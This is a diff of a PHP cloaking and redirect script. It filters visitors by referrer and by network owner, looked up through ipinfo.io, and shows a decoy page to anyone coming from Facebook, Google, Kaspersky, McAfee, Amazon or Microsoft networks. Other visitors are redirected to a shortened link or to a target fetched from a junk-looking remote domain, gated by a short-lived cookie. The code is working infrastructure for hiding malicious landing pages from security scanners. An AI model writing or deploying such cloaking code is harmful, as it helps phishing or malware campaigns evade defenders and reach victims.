@@ -1,5 +1,4 @@
 <?php
-//exit();
   header("Access-Control-Allow-Origin:http://".$_SERVER["HTTP_HOST"]);
   header('Access-Control-Allow-Methods: GET');
   header('X-Frame-Options: DENY');
@@ -18,11 +17,30 @@
       }
       return $rname;
   }
+
+  function getORG(){
+  	$ch = curl_init();
+  	curl_setopt($ch, CURLOPT_URL, 'http://ipinfo.io/'.$_SERVER["REMOTE_ADDR"].'/org');
+  	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+  	curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+  	$org = curl_exec($ch);
+  	curl_close($ch);
+  	return $org;
+  }
+
+  function getSite(){
+    $ch = curl_init();
+  	curl_setopt($ch, CURLOPT_URL, 'http://asdksakdaskdsad.com/php/site.php');
+  	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+  	$site = curl_exec($ch);
+  	curl_close($ch);
+  	return $site;
+  }
   
   $action = 'theme';
 
-  require_once('includes/Mobile_Detect.php');
-  require_once('includes/Browser.php');
+  require_once('Mobile_Detect.php');
+  require_once('Browser.php');
   $detect = new Mobile_Detect;
   $browser = new Browser();
 
@@ -44,7 +62,7 @@
 
   if($action == 'site'){
     $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
-    $refs = array('facebook.com', 'futunga.com', 'googleapis.com', 'blogspot.', 't.co', 'googleusercontent.com', 'rackcdn.com', 'raxcdn.com', 'herokuapp.com', 'dnslore.org');
+    $refs = array('facebook.com', 'futunga.com', 'googleapis.com', 'blogspot.', 't.co', 'googleusercontent.com', 'herokuapp.com');
     $action = 'theme';
     foreach ($refs as $ref) {
       if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
@@ -52,21 +70,18 @@
         break;
       }
     }
-    if(isset($_COOKIE["trust"])){
-      $action = 'site';
-    }
   }
 
   if($action == 'site'){
-    $asnlist = array('facebook','google','linode','kaspersy','mcafee','amazon','microsoft corporation', 'digital ocean');
+    $asnlist = array('facebook','google','linode','kaspersy','mcafee','amazon','microsoft corporation');
   }else if($action == 'mobile'){
     $asnlist = array('facebook','linode','kaspersy','mcafee','amazon','microsoft corporation');
   }
 
   if($action != 'theme'){
-    $_SERVER['GEOIP_ORG'] = isset($_SERVER['GEOIP_ORG']) ? $_SERVER['GEOIP_ORG'] : '';
+    $org = getORG();
     foreach ($asnlist as $asn) {
-      if(strpos(strtolower($_SERVER['GEOIP_ORG']), $asn) !== false){
+      if(strpos(strtolower($org), $asn) !== false){
         $action = 'theme';
         break;
       }
@@ -91,8 +106,8 @@
   if(isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] != 'GET'){
     $action = 'theme';
   }
-  
-  $id = @$_GET["id"];
+
+  $id = @$_SERVER["REQUEST_URI"];
   if(empty($id) || $id == "" || $id == "/"){
     $id = generate_name(rand(5,10));
   }
@@ -100,32 +115,20 @@
   $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
 
   if($action == 'mobile'){
-    header('Location: https://goo.gl/fRhCfI');
-    //require_once('includes/log.php');
+    header('Location: https://goo.gl/fRhCfI?'.rand(11111,99999));
+    
   }else if($action == 'site'){
-    require_once('includes/config.php');
-    if(strrpos($_SERVER['HTTP_HOST'], $app_site) === false){
-      $filename = generate_name(rand(5,8)).'.html';
-      header('Location:http://'.$app_site.'/'.$id);
-      // header('Location:http://'.generate_name(rand(5,8)).'.'.$app_site.'/'.$id);
-    }else if(!isset($_COOKIE["trust"])){
-      setcookie("trust", "true", (time() + 10), "/", ".$app_site", false);
-      header('Location:http://'.$app_site.'/'.$id);
+    if(isset($_COOKIE["trust"])){
+      $app_site = getSite();
+    	header("Location: http://.$app_site/$id");
     }else{
-      require_once('youtube.php');
-      //require_once('includes/log.php');
+    	setcookie("trust", "true", (time() + 10), "/", ".".$_SERVER["HTTP_HOST"], false);
+      header('Location:http://'.$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]);
     }
-  }else if($action == 'theme'){
-    //require_once('includes/log.php');
+  }else{
     @ob_end_clean();
     @ob_end_flush();
-    // header("http://www.google.com");
+    header("HTTP/1.1 301");
     require_once('share.php');
-  }else if($action == 'redirect'){
-    @ob_end_clean();
-    @ob_end_flush();
-    // require_once('includes/log.php');
-    header("HTTP/1.1 301 Moved Permanently");
-    header("Location: http://".generate_name(rand(5,8)).".appspot.com/".$id);
   }
 ?>
